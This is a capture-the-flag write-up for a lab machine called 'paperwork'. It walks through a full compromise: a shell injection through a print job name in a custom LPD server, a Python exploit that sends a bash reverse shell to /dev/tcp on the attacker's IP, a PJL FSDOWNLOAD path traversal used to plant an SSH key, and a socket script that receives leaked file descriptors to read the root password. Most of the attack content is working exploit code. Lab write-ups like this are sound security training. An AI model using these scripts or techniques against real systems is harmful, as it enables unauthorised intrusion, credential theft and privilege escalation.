# paperwork

```
Nmap scan report for paperwork.htb (10.129.37.133)
Host is up, received reset ttl 63 (0.065s latency).
Scanned at 2026-07-11 20:11:03 EDT for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.28.0 (Ubuntu)
|_http-server-header: nginx/1.28.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Intranet | Document Archiving Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

the web page is a document archiving service, that gives us info for sending print jobs, and also provides a download link to the source code for that service, which supposedly implementes RFC1179

in the source, i see that it binds to `tcp/1515` and runs the server. i confirm the port is open with `nc -v paperwork.htb 1515`

the page describes a "target queue" name to send our print jobs to, which in the source is read from the `VALID_QUEUE` env var.

after the server receives our job, it passes the job name unsafely into a `subprocess.Popen()`:

```python
...
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break


print(f"{self.id} Executing archive for: {job_name}")
cmd = f"echo 'Archive: {job_name}' >> /tmp/archive.log"
subprocess.Popen(cmd, shell=True)
...
```

so if our job name contains something like `'; <command> #`, we should get rce. a nice effect of commenting it like that is that nothing will be written to `archive.log`

we gotta send some preliminary data before this, like the correct command byte and size of our payload. importantly, the `subcommand` is never used in the distributed source code, but the website hints that it needs to be valid for our job to be processed. i brute forced that by just looping through 0-255 and injecting curls to myself with the subcommand in the path.

the final dirty exploit:

```python
#!/usr/bin/env python

import sys
import socket

RHOST = "10.10.15.124"
RPORT = 9001
PAYLOAD = f"bash -c 'bash -i &> /dev/tcp/{RHOST}/{RPORT} 0>&1'"
SUBC = b'\x02'
QUEUE = b'a'

payl = f"';{PAYLOAD} #"
payl_len = len(payl)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('paperwork.htb', 1515))
client.settimeout(0.2)

client.send(b'\x02' + QUEUE)

try:
    r = client.recv(1)
    if r == b"\x01":
        client.close()
        raise ValueError("[+] server rejected queue")
except socket.timeout:
    pass

client.send(SUBC + str(payl_len).encode() + b'\n')
print("[+] subc response: ", client.recv(1024))
client.send(f"J{payl}".encode())
print("[+] payload response: ", client.recv(1024))

client.close()
```

on the box i land as `lp` with not much perms. the first thing i check are internal services. here there is one on `1337` and `9100`. 1337 is just the internal port for the website that was being proxied by nginx. `9100` is more interesting, as it seems to be a custom `jetdirect` service running by user `archivist`

looking into that protocol, it seems jetdirect is a simplistic protocol that you can just send postscript (pcl) to for print jobs. not sure really how to exploit this, i looked around more on the system. there are a couple custom services, one of which is the `paperwork.service` which starts `/usr/bin/paperwork-daemon`.

that script is readable to us, and it seems like a way for users to check for malicious actions on the archive service. it scans the logs for certain commands, and if it finds them sends some evidence back over the unix socket. if the logs were clean, we get a "signature" made from a hash of `SYSTEM_CLEAN:<admin_pass>`. the important thing to notice in this script is that it loads this sensitive `admin_pins.conf` file that we can't read, even once we get to archivist. exploiting this script is the path to root after we escalate to `archivist`.

```python
try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)
```

the commands it looks for to check for malicious actions include `FSQUERY`, `FSDOWNLOAD`, `FSUPLOAD`. researching about this i found that these are commands from PJL, and extension to PCL that give you some extra commands to work with the print server.

```python
def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False
```

PJL commands start with `@PJL`. from the process's command line, it seems the server's pwd is `/home/archivist/printer`, and the interesting source file is `jetdirect.py`.

we can look around with `@PJL FSQUERY NAME="/"` and get a dir listing. this also tells us that the server is accepting unix paths. then, we can use the `FSUPLOAD` command to read files from the server.

![PJL](/images/paperwork/20260712_12h06m59s_grim.png)

here is the handler for the `FSDOWNLOAD` command, which lets us drop files on the printer's fs. [here is the language reference](https://developers.hp.com/system/files/attachments/PJLReference%282003%29_0.pdf). the server is not totally compliant with this so our arguments need to be in a specific order.

```python
def handle_download(command, client):
    m = re.search(r'NAME\s*=\s*"([^"]+)"\s*SIZE\s*=\s*(\d+)', command, re.I)
    if not m: return "FILEERROR=1"
    path, size = m.group(1), int(m.group(2))
    
    logging.info(f"Receiving file: {path} ({size} bytes)")
    data = b""
    while len(data) < size:
        chunk = client._client.recv(min(size - len(data), 4096))
        if not chunk: break
        data += chunk
    return fs.write(path, data)
```

the `fs.write()` function it uses calls `_translate`, which translates paths to posix, but in the process also resolves traversals with `normpath`:

```python
class Filesystem:
...
    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean)) # <--- resolve ../
...
    def write(self, path, data):
        target = self._translate(path)
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "wb") as f: f.write(data)
            return "OK"
        except: return "FILEERROR=1"
```

in effect, this means the `FSDOWNLOAD` command will let us write files anywhere (that archivist has perms to), and will also make the dirs for us!

sounds like a perfect opportunity to drop an ssh key:

```python
#!/usr/bin/env python3

import socket

PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF8h1avyr/rtSsRKKVFY7x72JQfUK8rX2pnqbrKllyB7"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost',9100))

client.send(b'@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE=' + str(len(PUBKEY)).encode() + b'\n' + PUBKEY.encode())
print("response: ", client.recv(1024))
```

now i ssh in as `archivist` -> user key

## root

now i focused my attention back on the `paperwork-daemon`. if the logs are clean, it gives us a hashed value crafted from the password we are interested in:

```python
if scan_for_malice():
    trigger_lockdown(conn)
else:
    secret = get_admin_secret()
    token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
    conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())
```

`trigger_lockdown` also empties the logfile, so getting a clean result is repeatable. our actions from before will trigger it.

![mgmt](/images/paperwork/20260712_12h24m49s_grim.png)

i tried to crack this hash with hashcat (prepending the `SYSTEM_CLEAN:` prefix), but it doesn't crack, at least not easily with pins or common passwords (file is called admin_pins.conf ?). so i gave up on that pretty quickly

what's interesting about `trigger_lockdown()` is that it will send us back the fd to that config file in the event of "malice".

```python
def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd]) # <--- package up the open fds
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)]) # <--- send them through the socket

        zip_path = "/root/quarantine/evidence.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(LOG_PATH, arcname="commands.log")


        with open(LOG_PATH, 'w') as f:
            f.truncate(0)

        os.close(log_fd)
    except:
        pass
```

this is a unique feature of unix sockets, letting us pass fds between processes. getting them back is just a couple lines:

```python
#!/usr/bin/python3

import socket
import os

client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
client.connect("/run/paperwork/mgmt.sock")

msg, fds, _, _= socket.recv_fds(client, 1024, 2)
print(f"[+] got msg: {msg}")
print(f"[+] got {len(fds)} fds")
for fd in fds:
    print(f"[+] data:\n{os.pread(fd, 1024, 0).decode().strip()}")
```

and it will read the data from both fds it receives, we just have to run the `pjlexploit.py` again to make the logs dirty

![getting admin pwd](/images/paperwork/20260712_12h33m39s_grim.png)

and that password works for root.

![pwned](/images/paperwork/20260712_12h39m21s_grim.png)

---

this box was a lot of just reading python code and shitty protocol implementations, and writing socket scripts to exploit them. honestly what I got caught up on the longest was not catching the inclusion of PJL in the PCL language that jetdirect accepts, even though I had seen those commands. I thought for a while we were only able to send print documents, and those commands were something custom. and i found bash was 777 so i thought that was the path for a bit. tldr do your research, it was obvious from the start that `:9100` was the escalation path, just had to figure out where those commands came from. i knew nothing about printing but now i know a little more i guess

